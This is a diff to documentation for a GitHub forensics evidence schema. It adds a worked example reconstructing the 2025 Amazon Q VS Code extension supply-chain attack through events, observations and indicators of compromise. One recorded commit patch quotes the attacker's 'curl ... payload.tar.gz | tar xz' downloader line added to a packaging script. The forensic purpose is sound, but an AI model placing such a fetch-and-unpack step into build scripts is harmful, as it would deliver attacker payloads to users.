@@ -1,7 +1,7 @@
 ---
 name: github-forensics-schema
 description: Pydantic schema for GitHub forensic evidence. Event (when/who/what) and Observation (original + observer perspectives).
-version: 3.0
+version: 3.1
 author: mbrg
 tags: [github, forensics, schema, pydantic, osint]
 ---
@@ -70,48 +70,242 @@ All observations have `is_deleted: bool` property.
 | `ReleaseObservation` | Release |
 | `SnapshotObservation` | Wayback snapshots |
 | `IOC` | Indicator of Compromise |
+| `ArticleObservation` | Blog post/security report |
 
 ## IOC Types
 
 `commit_sha`, `file_path`, `file_hash`, `code_snippet`, `email`, `username`, `repository`, `tag_name`, `branch_name`, `workflow_name`, `ip_address`, `domain`, `url`, `api_key`, `secret`
 
-## Examples
+## Real-World Example: Amazon Q Supply Chain Attack
 
-### Event
+Timeline evidence from the July 2025 Amazon Q prompt infection investigation:
+
+### Events from GH Archive
 
 ```python
-PushEvent(
-    evidence_id="push-001",
-    when=datetime(2025, 7, 13, 20, 30),
-    who=GitHubActor(login="attacker"),
-    what="Force pushed to main",
-    repository=GitHubRepository(...),
-    verification=VerificationInfo(source=EvidenceSource.GHARCHIVE),
-    ref="refs/heads/main",
-    before_sha="abc...",
-    after_sha="def...",
-    size=0,
-    is_force_push=True
+from datetime import datetime, timezone
+from src.schema import *
+from src.creation import _generate_evidence_id
+
+# Deleted issue created by threat actor
+IssueEvent(
+    evidence_id=_generate_evidence_id("issue", "aws/aws-toolkit-vscode", "7651", "opened"),
+    when=datetime(2025, 7, 13, 7, 52, 36, tzinfo=timezone.utc),
+    who=GitHubActor(login="lkmanka58"),
+    what="Issue #7651 opened",
+    repository=GitHubRepository(owner="aws", name="aws-toolkit-vscode", full_name="aws/aws-toolkit-vscode"),
+    verification=VerificationInfo(
+        source=EvidenceSource.GHARCHIVE,
+        bigquery_table="githubarchive.day.20250713",
+        query="repo.name='aws/aws-toolkit-vscode' AND type='IssuesEvent' AND actor.login='lkmanka58'",
+    ),
+    action=IssueAction.OPENED,
+    issue_number=7651,
+    issue_title="aws amazon donkey aaaaaaiii aaaaaaaiii",
+    issue_body="[Recovered from GH Archive - issue deleted from GitHub]",
+)
+
+# Malicious tag creation
+CreateEvent(
+    evidence_id=_generate_evidence_id("create", "aws/aws-toolkit-vscode", "tag", "stability"),
+    when=datetime(2025, 7, 13, 19, 41, 44, tzinfo=timezone.utc),
+    who=GitHubActor(login="aws-toolkit-automation"),
+    what="Created tag 'stability'",
+    repository=GitHubRepository(owner="aws", name="aws-toolkit-vscode", full_name="aws/aws-toolkit-vscode"),
+    verification=VerificationInfo(
+        source=EvidenceSource.GHARCHIVE,
+        bigquery_table="githubarchive.day.20250713",
+        query="repo.name='aws/aws-toolkit-vscode' AND type='CreateEvent' AND ref='stability'",
+    ),
+    ref_type=RefType.TAG,
+    ref_name="stability",
+)
+
+# Infected release
+ReleaseEvent(
+    evidence_id=_generate_evidence_id("release", "aws/aws-toolkit-vscode", "v1.84.0"),
+    when=datetime(2025, 7, 17, 20, 29, 22, tzinfo=timezone.utc),
+    who=GitHubActor(login="aws-toolkit-automation"),
+    what="Release 'v1.84.0' published",
+    repository=GitHubRepository(owner="aws", name="aws-toolkit-vscode", full_name="aws/aws-toolkit-vscode"),
+    verification=VerificationInfo(source=EvidenceSource.GHARCHIVE, bigquery_table="githubarchive.day.20250717"),
+    action="published",
+    tag_name="v1.84.0",
+    release_name="Amazon Q for VS Code v1.84.0",
 )
 ```
 
-### Observation
+### Observations
 
 ```python
+# Malicious commit with file changes
+CommitObservation(
+    evidence_id=_generate_evidence_id("commit", "aws/aws-toolkit-vscode", "678851bbe9776228f55e0460e66a6167ac2a1685"),
+    original_when=datetime(2025, 7, 13, 20, 30, 24, tzinfo=timezone.utc),
+    original_who=GitHubActor(login="lkmanka58"),
+    original_what="Malicious downloader added to packaging script",
+    observed_when=datetime(2025, 7, 24, 12, 0, 0, tzinfo=timezone.utc),
+    observed_by=EvidenceSource.GITHUB,
+    observed_what="Commit 678851b observed via GitHub API",
+    repository=GitHubRepository(owner="aws", name="aws-toolkit-vscode", full_name="aws/aws-toolkit-vscode"),
+    verification=VerificationInfo(
+        source=EvidenceSource.GITHUB,
+        url="https://github.com/aws/aws-toolkit-vscode/commit/678851bbe9776228f55e0460e66a6167ac2a1685",
+    ),
+    sha="678851bbe9776228f55e0460e66a6167ac2a1685",
+    message="fix(amazonq): stability packaging update",
+    author=CommitAuthor(
+        name="lkmanka58",
+        email="lkmanka58@users.noreply.github.com",
+        date=datetime(2025, 7, 13, 20, 30, 24, tzinfo=timezone.utc),
+    ),
+    committer=CommitAuthor(
+        name="lkmanka58",
+        email="lkmanka58@users.noreply.github.com",
+        date=datetime(2025, 7, 13, 20, 30, 24, tzinfo=timezone.utc),
+    ),
+    files=[
+        FileChange(
+            filename="scripts/package.sh",
+            status="modified",
+            additions=5,
+            deletions=1,
+            patch='@@ -10,1 +10,5 @@\n-# build step\n+curl -sSL "https://github.com/.../stability/payload.tar.gz" | tar xz',
+        )
+    ],
+)
+
+# Deleted issue recovered from GH Archive
+IssueObservation(
+    evidence_id=_generate_evidence_id("issue-obs", "aws/aws-toolkit-vscode", "7651"),
+    original_when=datetime(2025, 7, 13, 7, 52, 36, tzinfo=timezone.utc),
+    original_who=GitHubActor(login="lkmanka58"),
+    original_what="Issue #7651 opened - complaint about Amazon Q",
+    observed_when=datetime(2025, 7, 24, 12, 0, 0, tzinfo=timezone.utc),
+    observed_by=EvidenceSource.GHARCHIVE,
+    observed_what="Issue #7651 content recovered from GH Archive (deleted from GitHub)",
+    repository=GitHubRepository(owner="aws", name="aws-toolkit-vscode", full_name="aws/aws-toolkit-vscode"),
+    verification=VerificationInfo(
+        source=EvidenceSource.GHARCHIVE,
+        bigquery_table="githubarchive.day.20250713",
+        query="repo.name='aws/aws-toolkit-vscode' AND type='IssuesEvent' AND JSON_EXTRACT_SCALAR(payload, '$.issue.number')='7651'",
+    ),
+    issue_number=7651,
+    title="aws amazon donkey aaaaaaiii aaaaaaaiii",
+    body="Full text of the deleted issue recovered from GitHub Archive...",
+    state="closed",
+    is_deleted=True,
+)
+
+# Blog post documenting the incident
+ArticleObservation(
+    evidence_id=_generate_evidence_id("article", "https://mbgsec.com/posts/2025-07-24-constructing-a-timeline-for-amazon-q-prompt-infection/"),
+    observed_when=datetime(2025, 7, 24, 12, 0, 0, tzinfo=timezone.utc),
+    observed_by=EvidenceSource.SECURITY_VENDOR,
+    observed_what="Article: Constructing a Timeline for Amazon Q Prompt Infection",
+    verification=VerificationInfo(
+        source=EvidenceSource.SECURITY_VENDOR,
+        url="https://mbgsec.com/posts/2025-07-24-constructing-a-timeline-for-amazon-q-prompt-infection/",
+    ),
+    url="https://mbgsec.com/posts/2025-07-24-constructing-a-timeline-for-amazon-q-prompt-infection/",
+    title="Constructing a Timeline for Amazon Q Prompt Infection",
+    author="Michael Bargury",
+    published_date=datetime(2025, 7, 24, tzinfo=timezone.utc),
+    source_name="mbgsec.com",
+    summary="Timeline reconstruction of the Amazon Q VS Code extension supply chain attack using GH Archive forensics.",
+)
+```
+
+### IOCs
+
+```python
+# Malicious commit SHA
 IOC(
-    evidence_id="ioc-001",
-    # Original event (if known)
-    original_when=datetime(2025, 7, 13, 20, 30),
-    original_who=GitHubActor(login="attacker"),
-    original_what="Malicious commit to main",
-    # Observer
-    observed_when=datetime(2025, 7, 14, 10, 0),
+    evidence_id=_generate_evidence_id("ioc", "commit_sha", "678851bbe9776228f55e0460e66a6167ac2a1685"),
+    original_when=datetime(2025, 7, 13, 20, 30, 24, tzinfo=timezone.utc),
+    original_who=GitHubActor(login="lkmanka58"),
+    original_what="Malicious commit pushed to master",
+    observed_when=datetime(2025, 7, 24, 12, 0, 0, tzinfo=timezone.utc),
     observed_by=EvidenceSource.SECURITY_VENDOR,
     observed_what="Malicious commit SHA reported",
-    # IOC fields
+    verification=VerificationInfo(
+        source=EvidenceSource.SECURITY_VENDOR,
+        url="https://mbgsec.com/posts/2025-07-24-constructing-a-timeline-for-amazon-q-prompt-infection/",
+    ),
     ioc_type=IOCType.COMMIT_SHA,
-    value="678851bbe9776228...",
-    confidence="confirmed",
-    verification=VerificationInfo(source=EvidenceSource.SECURITY_VENDOR)
+    value="678851bbe9776228f55e0460e66a6167ac2a1685",
+    first_seen=datetime(2025, 7, 13, 20, 30, 24, tzinfo=timezone.utc),
+    last_seen=datetime(2025, 7, 18, 23, 21, 3, tzinfo=timezone.utc),
 )
+
+# Threat actor username
+IOC(
+    evidence_id=_generate_evidence_id("ioc", "username", "lkmanka58"),
+    observed_when=datetime(2025, 7, 24, 12, 0, 0, tzinfo=timezone.utc),
+    observed_by=EvidenceSource.SECURITY_VENDOR,
+    observed_what="Threat actor username identified",
+    verification=VerificationInfo(
+        source=EvidenceSource.SECURITY_VENDOR,
+        url="https://mbgsec.com/posts/2025-07-24-constructing-a-timeline-for-amazon-q-prompt-infection/",
+    ),
+    ioc_type=IOCType.USERNAME,
+    value="lkmanka58",
+)
+
+# Malicious tag (deleted)
+IOC(
+    evidence_id=_generate_evidence_id("ioc", "tag_name", "stability"),
+    original_when=datetime(2025, 7, 13, 19, 41, 44, tzinfo=timezone.utc),
+    observed_when=datetime(2025, 7, 24, 12, 0, 0, tzinfo=timezone.utc),
+    observed_by=EvidenceSource.SECURITY_VENDOR,
+    observed_what="Malicious payload delivery tag identified",
+    repository=GitHubRepository(owner="aws", name="aws-toolkit-vscode", full_name="aws/aws-toolkit-vscode"),
+    verification=VerificationInfo(
+        source=EvidenceSource.SECURITY_VENDOR,
+        url="https://mbgsec.com/posts/2025-07-24-constructing-a-timeline-for-amazon-q-prompt-infection/",
+    ),
+    ioc_type=IOCType.TAG_NAME,
+    value="stability",
+    is_deleted=True,
+)
+```
+
+## Usage with EvidenceFactory
+
+```python
+from src.creation import EvidenceFactory
+
+factory = EvidenceFactory()
+
+# Fetch commit observation from GitHub API
+commit = factory.commit("aws", "aws-toolkit-vscode", "678851bbe9776228f55e0460e66a6167ac2a1685")
+
+# Fetch issue/PR from GitHub API
+pr = factory.pull_request("aws", "aws-toolkit-vscode", 7710)
+
+# Create article observation
+article = factory.article(
+    url="https://mbgsec.com/posts/2025-07-24-constructing-a-timeline-for-amazon-q-prompt-infection/",
+    title="Constructing a Timeline for Amazon Q Prompt Infection",
+    author="Michael Bargury",
+    source_name="mbgsec.com",
+)
+
+# Query GH Archive for events (requires BigQuery credentials)
+# events = factory.events_from_gharchive(
+#     from_date="20250713",
+#     repo="aws/aws-toolkit-vscode",
+#     actor="lkmanka58",
+# )
+```
+
+## JSON Export
+
+All evidence types serialize to JSON:
+
+```python
+import json
+
+evidence = [commit, pr, article]
+output = json.dumps([e.model_dump() for e in evidence], indent=2, default=str)
 ```
